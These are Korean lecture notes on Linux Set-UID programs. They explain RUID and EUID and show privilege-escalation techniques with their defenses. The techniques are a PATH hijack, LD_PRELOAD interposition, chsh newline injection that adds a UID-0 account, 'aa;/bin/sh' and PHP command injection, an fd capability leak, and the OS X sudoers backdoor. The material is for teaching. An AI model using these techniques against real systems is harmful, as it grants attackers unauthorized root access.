Ch 3: Set-UID Privileged Programs

-rwsr-xr-x

소유자 실행 자리의 s 한 글자가 이 장의 전부입니다. 이 비트가 켜진 프로그램은 누가 실행하든 파일 소유자의 권한(EUID)으로 동작합니다 — 그래서 유용하고, 그래서 위험합니다.

01

권한 프로그램의 필요성

slides 2–3

Password Dilemma slide 2

/etc/shadow 파일은 소유자(root)만 쓸 수 있습니다.

-rw-r-----  1 root shadow  1443 May 23 12:33 /etc/shadow
                     ↑ 소유자에게만 쓰기 허용 (Only writable to the owner)

그런데 일반 사용자도 자기 비밀번호는 바꿔야 합니다. 파일에 직접 쓸 권한이 없는데 어떻게 자신의 비밀번호를 변경할까요? → 이 모순이 권한 프로그램(privileged program)이 필요한 이유입니다.

Two-Tier Approach — 2단계 접근 slide 3

OS 안에 세밀한(fine-grained) 접근 제어를 전부 넣으면 OS가 지나치게 복잡해집니다. 그래서 OS는 기본 접근 제어(rwx)만 담당하고, 세밀한 제어는 확장(extension)에 위임합니다.

  • root 는 shadow 파일을 직접 수정 가능
  • 일반 사용자 는 shadow 파일을 직접 수정 불가

이 확장이 바로 권한 프로그램입니다:

  • set-UID 프로그램
  • daemon

거친 제어 rwx 위에 +3bits(setuid·setgid·sticky)를 얹는 것 — 소금 한 꼬집을 더하는 것과 같습니다.

권한 프로그램만 세밀한 제어를 거쳐 자원에 접근한다.

두 가지 권한 프로그램 slide 4

종류설명
Daemon
(= Windows의 Service)		백그라운드에서 실행되는 프로그램. root 또는 다른 권한 사용자로 동작. 사용자는 비밀번호 변경 시 이 daemon에게 요청(request)을 보낸다.

Superman Story — 권한을 주는 두 가지 방식 slide 5

Power Suit 1.0 — 슈퍼히어로에게 모든 능력을 그대로 부여

  • 수트로 무엇이든 할 수 있음
  • 문제: 나쁜 슈퍼히어로가 있다면?

Power Suit 2.0 — 특정 작업용 칩(chip)만 장착

  • 각 칩의 동작은 미리 프로그래밍됨
  • 칩에 포함된 것만 수행 가능
  • 미리 정해진 작업에서 벗어날 방법이 없음
Set-UID = 리눅스에 구현된 "칩 방식" Power Suit.
Set-UID 메커니즘 은 Power Suit 2.0을 리눅스 OS에 구현한 것 — 능력을 통째로 주지 않고, 프로그램에 미리 코딩된 동작만 권한을 갖고 수행하게 한다.
03

Set-UID 개념 (RUID / EUID)

slides 6–7

핵심 정의 slides 6–7

  • Set-UID: 사용자가 프로그램 소유자의 권한으로 프로그램을 실행하게 허용 → 일시적(temporary) 권한 상승
  • 대표 예: passwd 프로그램
$ ls -l /usr/bin/passwd
-rwsr-xr-x 1 root root 41284 Sep 12 2012 /usr/bin/passwd

모든 프로세스는 두 개의 User ID를 가집니다.

ID의미
RUID
(Real UID)		프로세스의 실제 소유자를 식별
EUID
(Effective UID)		프로세스의 권한을 식별 — 접근 제어는 EUID 기준

일반 실행 vs Set-UID 실행 slide 7

일반 프로그램 실행 → RUID = EUID, 둘 다 실행한 사용자의 ID

Set-UID 실행 → RUID ≠ EUID

  • RUID = 여전히 실행한 사용자의 ID
  • EUID = 프로그램 소유자의 ID
  • 소유자가 root 라면 → root 권한으로 실행
RUID는 "누가"를, EUID는 "무슨 권한으로"를 나타낸다.
04

Set-UID 만들기 & 동작 원리

slides 8–11

프로그램을 Set-UID로 만들기 slide 8

① 소유자를 root로 변경 → ② Set-UID 비트 활성화

seed@VM:~$ cp /bin/cat ./mycat
seed@VM:~$ sudo chown root mycat
seed@VM:~$ ls -l mycat
-rwxr-xr-x 1 root seed 46764 Nov 1 13:09 mycat

# Set-UID 비트 켜기 전: 접근 거부
seed@VM:~$ mycat /etc/shadow
mycat: /etc/shadow: Permission denied

# Set-UID 비트 켠 후: 읽기 성공
seed@VM:~$ sudo chmod 4755 mycat
seed@VM:~$ mycat /etc/shadow
root:$6$012BPz.K$fbPkT6H6Db4/...:15933:0:99999:7:::
why 4___ ? chmod의 맨 앞 4가 Set-UID 비트다. 특수 권한 3비트는 4=setuid, 2=setgid, 1=sticky. 그래서 4755 = setuid + rwxr-xr-x.
"Set-UID 먼저 하고 chown root 하면?" 순서가 중요하다. chown은 보안상 Set-UID 비트를 자동으로 해제한다. 따라서 chown root → chmod 4755 순서여야 비트가 유지된다.

How it Works — id 프로그램으로 확인 slide 9

Set-UID 프로그램은 다른 프로그램과 똑같고, 단지 Set-UID 비트라는 단일 비트 하나만 표시되어 있을 뿐입니다.

$ cp /bin/id ./myid
$ sudo chown root myid
$ ./myid
uid=1000(seed) gid=1000(seed) groups=1000(seed), ...

$ sudo chmod 4755 myid
$ ./myid
uid=1000(seed) gid=1000(seed) euid=0(root) ...

Set-UID 비트를 켜자 euid=0(root) 가 나타납니다 — 실행 사용자는 seed 그대로지만 권한만 root로 상승.

ID 사용 예시 & setuid(getruid()) slide 10

Owner 17이 소유한 Set-UID 프로그램을 RUID 25 사용자가 실행하면:

  • 시작: RUID 25, EUID 17 → Owner 17의 파일을 read/write 가능
  • i = getruid() 로 실제 UID(25)를 얻고 setuid(i) 실행
  • 이후: RUID 25, EUID 25 → 이제 Owner 25의 파일에 접근 가능

즉 setuid() 로 스스로 권한을 다운그레이드하여 접근 대상이 바뀝니다.

setuid(getruid())로 EUID를 실제 UID로 되돌린다.

Set-UID 소유자에 따른 권한 차이 slide 11

상태명령결과
Set-UID 없음chown root + 일반 권한권한 프로그램 아님 → shadow 읽기 거부
root 소유 Set-UIDchown root + chmod 4755권한 프로그램 → shadow 읽기 성공
seed 소유 Set-UIDchown seed + chmod 4755여전히 권한 프로그램이지만 root 권한이 아님 → shadow 읽기 거부
Set-UID의 권한은 파일 소유자가 누구인가에 달려 있다. seed 소유 Set-UID는 seed 권한밖에 못 얻으므로 root 전용 파일엔 여전히 접근 불가.
05

Set-UID는 안전한가?

slide 12

왜 안전한가 — 그리고 왜 완전하진 않은가 slide 12

Set-UID는 일반 사용자가 권한을 상승(escalate)하게 해줍니다. 하지만 sudo와는 다릅니다.

방식사용자가 할 수 있는 것
sudo (직접 권한 부여)권한을 얻은 뒤 무엇이든 가능
Set-UID (제한된 동작)프로그램에 포함된 것만 가능 (Superman 칩)
모든 프로그램을 Set-UID로 만드는 것은 위험하다.
  • /bin/sh → root 셸을 그대로 제공하게 됨
  • vi → 편집기 안에서 임의 명령 실행 가능

즉 "제한된 동작"이 성립하려면 프로그램 자체가 안전하게 설계돼야 한다 — 다음 섹션의 공격들은 모두 이 가정이 깨지는 경우다.

환경변수를 통한 공격 (PATH)

slides 15–18

환경변수란 slide 15

프로그램 동작은 코드 안에 보이지 않는 입력에 의해서도 영향을 받습니다. 환경변수는 사용자가 프로그램 실행 전에 설정할 수 있습니다 (printenv, env). 그중 PATH가 가장 위험합니다.

$ env
PWD=/home/scho   HOME=/home/scho   SHELL=/bin/bash
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:...

PATH 변수 & system() slide 16

PATH는 사용자가 전체 경로를 안 줄 때 셸이 명령을 찾는 순서를 정합니다.

  • system() 은 내부적으로 /bin/sh 를 먼저 호출
  • system("ls") → /bin/sh 가 PATH를 뒤져 "ls"를 찾음
$ whereis ls
ls: /bin/ls
$ echo $PATH
/usr/local/sbin:...:/sbin:/bin:/usr/games:...
공격자가 PATH 변수를 조작하면 "ls"가 어디서 찾아지는지 통제할 수 있다 → 가짜 ls를 실행시킬 수 있음.

Case Study — 취약 프로그램 공격 slides 17–18

취약 프로그램은 전체 경로 없이 system("cal") 을 호출합니다.

/* vul.c — 취약한 프로그램 */#include <stdlib.h>
int main() {
    system("cal");  // 전체 경로 없음!
}
/* 악성 "cal" 프로그램 */int main() {
    system("/bin/dash");  // 셸 실행
}
seed@ubuntu:$ gcc -o vul vul.c
seed@ubuntu:$ sudo chown root vul
seed@ubuntu:$ sudo chmod 4755 vul
# ① 공격 없이 실행 → 정상 달력 출력
seed@ubuntu:$ vul
   December 2015 ...

# ② PATH에 현재 디렉터리(.)를 맨 앞에 추가
seed@ubuntu:$ gcc -o cal cal.c
seed@ubuntu:$ export PATH=.:$PATH
seed@ubuntu:$ vul
#   ← root shell 획득!
# id
uid=1000(seed) gid=1000(seed) euid=0(root)
PATH 맨 앞에 .을 넣으면 system("cal")이 공격자의 ./cal을 root로 실행한다.
how to defend? Set-UID 프로그램에서 system() 을 쓰지 말 것. 외부 명령은 반드시 전체 경로를 지정하고, 신뢰할 수 없는 환경변수(PATH 등)를 초기화한다. → 근본 해법은 섹션 09의 execve().
08

동적 링커를 통한 공격 (LD_PRELOAD)

slides 19–24

정적 링킹 vs 동적 링킹 slides 19–20

링킹은 프로그램이 참조하는 외부 라이브러리 코드를 찾는 과정으로, 컴파일 시점 또는 런타임에 수행됩니다.

  • 정적 링킹: 링커가 프로그램 코드와 라이브러리 코드(printf() 등)를 합쳐 하나로 만듦
  • 동적 링킹: 런타임에 환경변수를 사용 → 환경변수가 공격 표면이 됨
$ gcc -o hello_dynamic hello.c
$ gcc -static -o hello_static hello.c
$ ls -l
-rw-rw-r-- 1 seed seed     68  hello.c
-rwxrwxr-x 1 seed seed   7162  hello_dynamic
-rwxrwxr-x 1 seed seed 751294  hello_static

정적 컴파일 프로그램은 동적 대비 약 100배 큽니다.

정적 링킹은 라이브러리를 통째로 포함 → 파일 크기 폭증.

동적 링킹 구조 — ldd로 확인 slide 21

$ ldd hello_static
    not a dynamic executable
$ ldd hello_dynamic
    linux-gate.so.1 => (0xb774b000)            # system calls용
    libc.so.6 => /lib/i386-linux-gnu/libc.so.6   # printf(), sleep() 포함
    /lib/ld-linux.so.2 (0xb774c000)              # 동적 링커 자신

동적 링커 자체가 공유 라이브러리이며, main 함수보다 먼저 호출됩니다. libc는 printf(), sleep() 같은 함수를 담고 있습니다.

Case Study 1 — LD_PRELOAD로 sleep() 가로채기 slides 22–23

프로그램은 동적 링크된 sleep() 을 호출합니다. 공격자는 자기만의 sleep() 을 만들어 끼워넣습니다.

/* mytest.c */int main() {
    sleep(1);
    return 0;
}
/* sleep.c — 가짜 sleep */#include <stdio.h>
void sleep(int s) {
    printf("I am not sleeping!\n");
}
$ gcc -c sleep.c
$ gcc -shared -o libmylib.so.1.0.1 sleep.o
$ export LD_PRELOAD=./libmylib.so.1.0.1
$ ./mytest
I am not sleeping!   ← 우리 라이브러리 호출됨!
$ unset LD_PRELOAD
$ ./mytest
(정상적으로 1초 대기)

LD_PRELOAD 는 다른 어떤 라이브러리보다 먼저 로드할 공유 라이브러리를 지정한다. 그래서 표준 sleep() 대신 공격자 버전이 링크된다.

대응책 검증 — Set-UID 프로그램에서는 무시된다 slide 24

env 프로그램을 복사해 root 소유 Set-UID로 만든 뒤 두 프로그램을 비교합니다.

$ cp /usr/bin/env ./myenv
$ sudo chown root myenv
$ sudo chmod 4755 myenv
-rwsr-xr-x 1 root seed 22060 myenv
대응책: 동적 링커는 프로그램이 Set-UID(EUID≠RUID)일 때 LD_PRELOAD, LD_LIBRARY_PATH 같은 위험한 환경변수를 무시한다.
$ export LD_PRELOAD=./libmylib.so.1.0.1
$ export LD_LIBRARY_PATH=.
$ export LD_MYOWN="my own value"

# 일반 env 프로그램: 모두 보임
$ env | grep LD_
LD_PRELOAD=./libmylib.so.1.0.1
LD_LIBRARY_PATH=.
LD_MYOWN=my own value

# Set-UID myenv: LD_PRELOAD/LD_LIBRARY_PATH 제거됨!
$ myenv | grep LD_
LD_MYOWN=my own value   ← LD_로 시작하는 위험 변수만 사라짐
09

사용자 입력 공격 & execve

slides 25–32

사용자 입력 — 명시적 입력의 위험 slides 25–26

User Inputs (Explicit Inputs)

  • Buffer Overflow: 버퍼를 넘치게 해 악성 코드 실행
  • Format String: 사용자 입력을 포맷 문자열로 넘겨 동작 변경

CHSH (Change Shell) — 기본 셸을 바꾸는 Set-UID 프로그램. 셸 정보는 /etc/passwd 에 저장.

  • 문제: 사용자 입력을 검증(sanitize)하지 않음
  • 공격자가 새 root 계정을 만들 수 있음
# /etc/passwd 한 줄의 형식: name:pw:UID:GID:info:home:shell
bob:$6$jUODEFsfwfi3:1000:1000:Bob Smith,,,:/home/bob:/bin/bash

# 정상 사용
$ chsh -s /usr/bin/dash
# 공격: 개행(\n)을 넣어 두 번째 줄에 UID=0, GID=0 계정 주입
$ chsh -s "/usr/bin/zsh\n myroot:???:0:0:MY backdoor:/home:/bin/bash"
입력에 개행이 들어가 두 줄이 되고, 3·4번째 필드(UID·GID)에 0을 넣으면 → 새로운 root 계정이 생성된다.

외부 명령 호출 — 데이터가 코드로 변하는 위험 slide 27

  • Set-UID 프로그램이 내부에서 외부 명령을 호출할 때, 명령은 프로그램이 선택해야 한다(사용자가 명령을 정하면 안전하지 않음).
  • 사용자는 보통 명령에 넘길 입력 데이터만 제공한다.
  • 명령 호출이 잘못되면 사용자의 입력 데이터가 명령 이름으로 변질될 수 있다 → 위험.

Unsafe Approach — system() slides 28–29

외부 명령을 호출하는 가장 쉬운 방법이 system() 이지만, 가장 위험합니다. 아래는 /bin/cat 을 실행하려는 root 소유 Set-UID 프로그램입니다.

int main(int argc, char *argv[]) {
  char *cat = "/bin/cat";
  if (argc < 2) {
    printf("Please type a file name.\n");
    return 1;
  }
  char *command = malloc(strlen(cat)+strlen(argv[1])+2);
  sprintf(command, "%s %s", cat, argv[1]);
  system(command);   // 위험!
  return 0;
}
$ sudo chmod 4755 catall
$ catall /etc/shadow
root:$6$012BPz.K$fbPkT6H6Db4/B8cLWb....

# 공격 입력: 세미콜론으로 명령 주입
$ catall "aa;/bin/sh"
/bin/cat: aa: No such file or directory
#   ← root shell 획득!
# id
uid=1000(seed) gid=1000(seed) euid=0(root) groups=0(root)
Problem: 데이터의 일부(;/bin/sh)가 코드(명령 이름)로 변한다. system() 이 /bin/cat aa;/bin/sh 를 셸에 통째로 넘기기 때문.
참고 (slide 30): Ubuntu 16.04에서 /bin/sh → /bin/dash 이며, dash는 Set-UID 프로세스에서 실행되면 권한을 버린다. 그래서 위 공격은 일반 셸만 얻는다. 실습에서 취약점을 재현하려면 sudo ln -sf /bin/zsh /bin/sh 로 대응책을 제거한다(실험 후 /bin/dash 로 복원).

Safe Approach — execve() slides 31–32

int main(int argc, char *argv[]) {
  char *v[3];
  if (argc < 2) {
    printf("Please type a file name.\n");
    return 1;
  }
  v[0] = "/bin/cat"; v[1] = argv[1]; v[2] = 0;
  execve(v[0], v, 0);   // 안전!
  return 0;
}
# 공격을 시도해도
$ safecatall "aa;/bin/sh"
/bin/cat: aa;/bin/sh: No such file or directory
← Attack failed! 데이터는 여전히 데이터로 취급됨
execve는 명령(코드)과 데이터를 분리 → 데이터가 코드가 될 수 없다.
왜 안전한가? execve() 는 명령 이름(코드)과 데이터를 명확히 분리한다. 사용자 데이터가 코드로 변할 경로 자체가 없다. 게다가 셸(/bin/sh)을 거치지 않으므로 PATH·세미콜론 주입도 통하지 않는다.

시스템 입력을 통한 공격 (Race Condition)

slide 33

System Inputs — Race Condition slide 33

  • Race Condition (경쟁 상태)
  • 비권한 파일에서 권한 파일로 향하는 심볼릭 링크(symbolic link)를 걸어 프로그램을 속임
  • 프로그램의 동작에 영향을 줌 (Influence programs)
  • world-writable 폴더에 쓰는 행위가 표적이 됨
전형적 TOCTOU(Time-of-Check to Time-of-Use) 공격: 프로그램이 파일을 "검사한 시점"과 "사용하는 시점" 사이의 틈에, 공격자가 그 경로를 권한 파일로 바꿔치기(심볼릭 링크)한다.
11

Capability Leaking

slides 34–38

개념 — su 프로그램의 예 slide 34

권한 프로그램이 실행 중 스스로 권한을 다운그레이드하는 경우가 있습니다. 대표 예가 su 입니다.

  • su 는 권한 Set-UID 프로그램 — 한 사용자가 다른 사용자로 전환(user1 → user2)
  • 시작: EUID = root, RUID = user1
  • 비밀번호 검증 후: EUID·RUID 모두 user2로 (권한 다운그레이드)
Capability Leaking: 이런 프로그램이 다운그레이드 전에 권한 자원(열린 파일 등)을 정리하지 않으면, 권한이 낮아진 뒤에도 그 자원이 계속 유효해 악용된다.

예제 — 닫지 않은 파일 디스크립터 slides 35–36

/* /etc/zzz는 root 소유(0644),
   root만 쓰기 가능한 중요 파일 */
fd = open("/etc/zzz", O_RDWR | O_APPEND);
if (fd == -1) {
   printf("Cannot open /etc/zzz\n");
   exit(0);
}
printf("fd is %d\n", fd);

// 권한 영구 해제 (EUID = RUID)
setuid(getuid());   // ← 다운그레이드

// /bin/sh 실행 → 동작 제한 해제
v[0] = "/bin/sh"; v[1] = 0;
execve(v[0], v, 0);
$ ls -l /etc/zzz
-rw-r--r-- 1 root root 7 /etc/zzz
$ sudo chmod 4755 cap_leak
$ cat /etc/zzz
bbbbbbbbbbbbbbb
# 일반 사용자로는 쓰기 불가
$ echo aaaa > /etc/zzz
bash: /etc/zzz: Permission denied

$ cap_leak
fd is 3
# 누출된 fd 3을 그대로 사용!
$ echo ccccc >& 3   ← leaked capability
$ exit
$ cat /etc/zzz
bbbbbbbbbbbbbbb
ccccc   ← File modified! 파일이 수정됨
닫지 않은 fd가 권한 하락 후에도 살아남아 root 전용 파일을 쓴다.
How to fix? 다운그레이드하기 전에 권한으로 연 자원을 정리한다 — close(fd) 를 setuid() 앞에 넣으면 누출이 사라진다.

User Identity API — seteuid() vs setuid() slide 37

함수동작
getuid()호출 프로세스의 real UID 반환
geteuid()호출 프로세스의 effective UID 반환
seteuid(uid)EUID만 설정 (임시 변경)
setuid(uid)EUID 설정 + 권한 프로세스(CAP_SETUID)라면 real UID와 saved set-user-ID까지 함께 설정 (영구 변경)
핵심 차이: seteuid() 는 되돌릴 수 있는 임시 변경, setuid() 는 saved UID까지 바꿔 되돌릴 수 없는 영구 폐기. 권한을 완전히 버리려면 setuid().

OS X Case Study — DYLD_PRINT_TO_FILE slide 38

2015년 7월 OS X Yosemite(10.10)가 capability leaking 관련 권한 상승 취약점에 노출되었습니다. 동적 링커 dyld 에 추가된 DYLD_PRINT_TO_FILE 환경변수가 원인입니다.

dyld는 어떤 파일이든 열 수 있고, root 소유 Set-UID 프로그램에서는 root 권한으로 동작하는데, 그 파일을 닫지 않아 capability leaking이 발생했습니다.

시나리오결과
Scenario 1 (safe)Set-UID가 작업을 끝내고 프로세스가 종료 → 모두 정리되어 안전
Scenario 2 (unsafe)su 처럼 권한을 다운그레이드하고 제한을 해제 → 누출된 fd로 /etc/sudoers 에 쓰기 가능
OS X 10.10:$ DYLD_PRINT_TO_FILE=/etc/sudoers
OS X 10.10:$ su bob
Password:
bash:$ echo "bob ALL=(ALL) NOPASSWD:ALL" >& 3   ← sudoers에 백도어 주입

다른 언어에서의 외부 명령 호출 slide 39

외부 명령 호출 위험은 C에 한정되지 않습니다. Perl의 open(), PHP의 system() 도 셸을 거치므로 같은 문제가 생깁니다.

<?php
  $dir = $_GET['dir'];
  system("/bin/ls $dir");
?>

# 공격 URL
http://localhost/list.php?dir=.;date
# 서버에서 실행되는 명령: "/bin/ls .;date" → date까지 실행됨

보안 원칙

slides 40–41

Principle of Isolation slide 40

원칙: 코드와 데이터를 섞지 마라 (Don't mix code and data).

이 원칙 위반으로 생기는 공격들:

  • system() code execution
  • Cross Site Scripting (XSS)
  • SQL injection
  • Buffer Overflow

Principle of Least Privilege slide 41

권한 프로그램은 작업에 필요한 만큼의 권한만 가져야 합니다.

  • 권한이 필요 없을 땐 비활성화(임시/영구)
  • Linux: seteuid() / setuid() 로 권한 비활성화·폐기
  • OS마다 방법이 다름

핵심 요약

전 범위

Set-UID의 본질

실행 시 EUID를 소유자 권한으로 올려 일시적 권한 상승을 준다. 접근 제어는 EUID 기준. chmod 4755 의 4가 그 비트.

제한된 권한 상승

sudo와 달리 프로그램에 코딩된 동작만 가능(Superman 칩). 단, 코딩 결함이 있으면 이 가정이 깨진다.

환경변수 공격

PATH 조작 + system(), LD_PRELOAD 로 라이브러리 가로채기. 대응: system 금지, Set-UID에선 LD_* 무시.

입력 공격

데이터가 코드(명령 이름)로 변질: "aa;/bin/sh", chsh \n 개행 주입. 대응: execve() 로 코드·데이터 분리.

Capability Leaking

다운그레이드 전 열린 fd를 닫지 않으면 권한 하락 후에도 자원이 살아남는다. 대응: close() 를 setuid() 앞에.

두 대원칙

Isolation(코드·데이터 분리)과 Least Privilege(필요 최소 권한)가 모든 대응책을 관통한다.
